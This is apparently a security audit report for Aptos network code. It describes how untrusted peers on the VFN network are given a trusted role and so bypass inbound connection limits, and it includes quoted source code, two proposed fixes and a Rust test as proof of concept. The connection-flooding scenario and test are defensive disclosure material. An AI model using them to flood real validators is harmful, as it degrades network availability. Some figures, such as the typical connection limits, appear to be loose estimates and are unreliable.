# Audit Report

## Title
Inbound Connection Limit Bypass via Incorrect PeerRole Assignment on VFN Network

## Summary
Validators on the VFN (Validator Full Node) network incorrectly assign `PeerRole::ValidatorFullNode` to untrusted inbound peers through role inference logic, causing these connections to bypass inbound connection limits. This allows attackers to exhaust validator resources through connection flooding attacks.

## Finding Description

The vulnerability stems from a logic mismatch between the role assignment in the Noise handshake layer and the security assumptions in the peer manager layer.

**In the Noise handshake layer**, when a validator receives an inbound connection on the VFN network using `MaybeMutual` authentication mode, untrusted peers (not in `trusted_peers`) are assigned `PeerRole::ValidatorFullNode` through role inference logic: [1](#0-0) 

Specifically, when the peer is NOT in the trusted peers set, the code infers the role based on network context. For validators on the VFN network, it assigns `PeerRole::ValidatorFullNode`: [2](#0-1) 

**In the peer manager layer**, the `handle_new_connection_event` function contains logic to enforce inbound connection limits for unknown peers. However, it explicitly checks if `conn.metadata.role == PeerRole::Unknown` before applying these limits: [3](#0-2) 

The code comment at lines 353-354 states: "Everything below here is meant for unknown peers only. The role comes from the Noise handshake and if it's not `Unknown` then it is trusted." This assumption is **incorrect** because roles can be assigned via inference (not just from `trusted_peers`).

**Attack Scenario:**
1. Attacker discovers a validator's VFN network address and port
2. Attacker connects to the validator on the VFN network
3. Attacker completes the Noise handshake with any keypair (not in `trusted_peers`)
4. The validator assigns `PeerRole::ValidatorFullNode` via inference logic
5. In `handle_new_connection_event`, the check `conn.metadata.role == PeerRole::Unknown` fails
6. The connection limit enforcement block (lines 356-389) is **completely skipped**
7. Attacker repeats steps 2-6 to create unlimited connections, bypassing the `inbound_connection_limit`

## Impact Explanation

This vulnerability enables **connection exhaustion attacks** against validators, which qualifies as **High Severity** per the Aptos bug bounty program category "Validator node slowdowns."

An attacker can:
- Exhaust file descriptors (each TCP connection consumes one)
- Consume memory (each connection maintains state)
- Degrade validator performance through connection management overhead
- Potentially trigger out-of-memory conditions or system instability
- Impact consensus participation if the validator becomes overloaded

The `MAX_INBOUND_CONNECTIONS` default is typically limited (e.g., 100-1000 connections) to prevent resource exhaustion, but this protection is bypassed for VFN network connections from untrusted peers.

## Likelihood Explanation

**Likelihood: High**

Requirements for exploitation:
- Knowledge of validator's VFN network address (may be discoverable through on-chain data, configuration leaks, or network scanning)
- Ability to establish TCP connections to the VFN network port
- Ability to complete the Noise handshake protocol (standard cryptographic operation)

No special privileges, validator insider access, or complex exploitation techniques are required. The VFN network, while intended for semi-private use between validators and their VFNs, may be accessible if:
- Firewall rules are misconfigured
- The network architecture assumes it's acceptable for any peer to connect
- Deployment configurations expose the VFN port

## Recommendation

**Option 1: Fix the role inference logic** - Only assign non-Unknown roles to peers in the trusted_peers set:

```rust
// In handshake.rs, change the inference logic:
None => {
    // The peer is not in the trusted peer set. Verify that the Peer ID is
    // constructed correctly from the public key.
    let derived_remote_peer_id = 
        aptos_types::account_address::from_identity_public_key(remote_public_key);
    if derived_remote_peer_id != remote_peer_id {
        Err(NoiseHandshakeError::ClientPeerIdMismatch(...))
    } else {
        // Untrusted peers always get Unknown role, regardless of network
        Ok(PeerRole::Unknown)
    }
},
```

**Option 2: Add explicit trusted peer check** - Before bypassing connection limits, verify the peer is actually in trusted_peers:

```rust
// In peer_manager/mod.rs handle_new_connection_event:
if conn.metadata.origin == ConnectionOrigin::Inbound {
    // Check if this is an untrusted peer (not in trusted_peers)
    let is_untrusted = trusted_peers.get(&conn.metadata.remote_peer_id).is_none();
    
    if is_untrusted {
        // Apply connection limits to all untrusted peers, regardless of inferred role
        let unknown_inbound_conns = self.active_peers.iter()
            .filter(|(peer_id, (metadata, _))| {
                metadata.origin == ConnectionOrigin::Inbound
                    && trusted_peers.get(peer_id).is_none()
            })
            .count();
            
        if !self.active_peers.contains_key(&conn.metadata.remote_peer_id)
            && unknown_inbound_conns + 1 > self.inbound_connection_limit {
            // Reject connection
            self.disconnect(conn);
            return;
        }
    }
}
```

**Recommended approach:** Option 1 is cleaner and fixes the root cause - the role should accurately represent whether the peer is trusted.

## Proof of Concept

```rust
// Rust integration test demonstrating the vulnerability
#[tokio::test]
async fn test_vfn_connection_limit_bypass() {
    use aptos_config::config::{Peer, PeerRole, RoleType};
    use aptos_config::network_id::{NetworkContext, NetworkId};
    use aptos_crypto::x25519;
    use aptos_memsocket::MemorySocket;
    use aptos_network::noise::HandshakeAuthMode;
    use aptos_network::noise::NoiseUpgrader;
    
    // Setup: Create a validator node on VFN network with MaybeMutual auth
    let validator_key = x25519::PrivateKey::generate(&mut rand::rngs::OsRng);
    let validator_context = NetworkContext::new(
        RoleType::Validator,
        NetworkId::Vfn,
        PeerId::random()
    );
    let peers_and_metadata = Arc::new(PeersAndMetadata::new(&[NetworkId::Vfn]));
    let auth_mode = HandshakeAuthMode::maybe_mutual(peers_and_metadata.clone());
    let validator_upgrader = NoiseUpgrader::new(
        validator_context,
        validator_key,
        auth_mode
    );
    
    // Attack: Untrusted attacker connects multiple times
    let inbound_connection_limit = 10; // Assume configured limit
    
    for i in 0..(inbound_connection_limit + 5) {
        // Attacker generates random keypair (not in trusted_peers)
        let attacker_key = x25519::PrivateKey::generate(&mut rand::rngs::OsRng);
        let attacker_context = NetworkContext::new(
            RoleType::FullNode,
            NetworkId::Vfn,
            PeerId::random()
        );
        let attacker_upgrader = NoiseUpgrader::new(
            attacker_context,
            attacker_key,
            HandshakeAuthMode::server_only(&[NetworkId::Vfn])
        );
        
        // Establish connection
        let (dialer_socket, listener_socket) = MemorySocket::new_pair();
        
        let (attacker_result, validator_result) = tokio::join!(
            attacker_upgrader.upgrade_outbound(
                dialer_socket,
                validator_context.peer_id(),
                validator_upgrader.noise_config.public_key(),
                || [0u8; 8]
            ),
            validator_upgrader.upgrade_inbound(listener_socket)
        );
        
        // Verify: Connection succeeds even after limit
        assert!(validator_result.is_ok(), "Connection {} should succeed", i);
        let (_, _, role) = validator_result.unwrap();
        
        // BUG: Untrusted peer gets ValidatorFullNode role
        assert_eq!(role, PeerRole::ValidatorFullNode);
        
        // This connection bypasses inbound_connection_limit check
        // Expected: Connections beyond limit should be rejected
        // Actual: All connections accepted with ValidatorFullNode role
    }
    
    println!("VULNERABILITY: Created {} connections, bypassing limit of {}",
             inbound_connection_limit + 5, inbound_connection_limit);
}
```

## Notes

The vulnerability exists at the intersection of two components that make conflicting assumptions:

1. The handshake layer infers `PeerRole::ValidatorFullNode` for any inbound peer on the VFN network, regardless of whether they're in `trusted_peers`

2. The peer manager layer assumes that any role other than `Unknown` indicates a trusted peer (from `trusted_peers`)

This architectural mismatch creates a security hole where untrusted peers can impersonate trusted peers in terms of connection limit enforcement, even though peer identity (`remote_peer_id`) remains cryptographically authenticated.

The address field (`addr`) mentioned in the original security question is used for logging and peer monitoring, but the more critical issue is the role field trust assumption that enables the connection limit bypass.

### Citations

**File:** network/framework/src/noise/handshake.rs (L384-426)
```rust
            HandshakeAuthMode::MaybeMutual(peers_and_metadata) => {
                let trusted_peers = peers_and_metadata.get_trusted_peers(&network_id)?;
                let trusted_peer = trusted_peers.get(&remote_peer_id).cloned();
                match trusted_peer {
                    Some(peer) => {
                        Self::authenticate_inbound(remote_peer_short, &peer, &remote_public_key)
                    },
                    None => {
                        // The peer is not in the trusted peer set. Verify that the Peer ID is
                        // constructed correctly from the public key.
                        let derived_remote_peer_id =
                            aptos_types::account_address::from_identity_public_key(
                                remote_public_key,
                            );
                        if derived_remote_peer_id != remote_peer_id {
                            // The peer ID is not constructed correctly from the public key
                            Err(NoiseHandshakeError::ClientPeerIdMismatch(
                                remote_peer_short,
                                remote_peer_id,
                                derived_remote_peer_id,
                            ))
                        } else {
                            // Try to infer the role from the network context
                            if self.network_context.role().is_validator() {
                                if network_id.is_vfn_network() {
                                    // Inbound connections to validators on the VFN network must be VFNs
                                    Ok(PeerRole::ValidatorFullNode)
                                } else {
                                    // Otherwise, they're unknown. Validators will connect through
                                    // authenticated channels (on the validator network) so shouldn't hit
                                    // this, and PFNs will connect on public networks (which aren't common).
                                    Ok(PeerRole::Unknown)
                                }
                            } else {
                                // We're a VFN or PFN. VFNs get no inbound connections on the vfn network
                                // (so the peer won't be a validator). Thus, we're on the public network
                                // so mark the peer as unknown.
                                Ok(PeerRole::Unknown)
                            }
                        }
                    },
                }
            },
```

**File:** network/framework/src/peer_manager/mod.rs (L352-389)
```rust
        if conn.metadata.origin == ConnectionOrigin::Inbound {
            // Everything below here is meant for unknown peers only. The role comes from
            // the Noise handshake and if it's not `Unknown` then it is trusted.
            if conn.metadata.role == PeerRole::Unknown {
                // TODO: Keep track of somewhere else to not take this hit in case of DDoS
                // Count unknown inbound connections
                let unknown_inbound_conns = self
                    .active_peers
                    .iter()
                    .filter(|(peer_id, (metadata, _))| {
                        metadata.origin == ConnectionOrigin::Inbound
                            && trusted_peers
                                .get(peer_id)
                                .is_none_or(|peer| peer.role == PeerRole::Unknown)
                    })
                    .count();

                // Reject excessive inbound connections made by unknown peers
                // We control outbound connections with Connectivity manager before we even send them
                // and we must allow connections that already exist to pass through tie breaking.
                if !self
                    .active_peers
                    .contains_key(&conn.metadata.remote_peer_id)
                    && unknown_inbound_conns + 1 > self.inbound_connection_limit
                {
                    info!(
                        NetworkSchema::new(&self.network_context)
                            .connection_metadata_with_address(&conn.metadata),
                        "{} Connection rejected due to connection limit: {}",
                        self.network_context,
                        conn.metadata
                    );
                    counters::connections_rejected(&self.network_context, conn.metadata.origin)
                        .inc();
                    self.disconnect(conn);
                    return;
                }
            }
```
